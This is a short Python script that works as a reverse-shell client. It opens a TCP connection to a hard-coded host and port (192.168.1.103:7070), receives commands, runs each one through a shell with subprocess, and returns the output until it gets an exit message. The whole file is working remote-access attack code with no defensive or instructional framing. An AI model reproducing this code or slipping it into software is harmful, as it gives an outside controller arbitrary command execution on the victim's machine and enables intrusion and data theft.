import socket
import subprocess

ip_addr="192.168.1.103"
port=7070
header=64
encoding="utf-8"
exit_msg="!exit"

connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect((ip_addr,port))

def send_msg(msg:str,conn):
    msg_len=len(msg.encode(encoding))
    msg_len_encode=str(msg_len).encode(encoding)
    msg_len_encode+=b" "*(header-len(msg_len_encode))
    conn.send(msg_len_encode)                         #send msg lem
    conn.send(msg.encode(encoding))                   #send msg 

while True:
    cmd_len=connection.recv(header).decode(encoding)
    cmd=connection.recv(int(cmd_len)).decode(encoding)
    if cmd==exit_msg:
        connection.close()
        connection.shutdown(socket.SHUT_RDWR)
        break
    resault=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    msg=resault.stdout.read().decode()
    msg_error=resault.stderr.read().decode()
    if msg_error=="":
        send_msg(msg,connection)
    elif msg=="":
        send_msg(msg_error,connection)
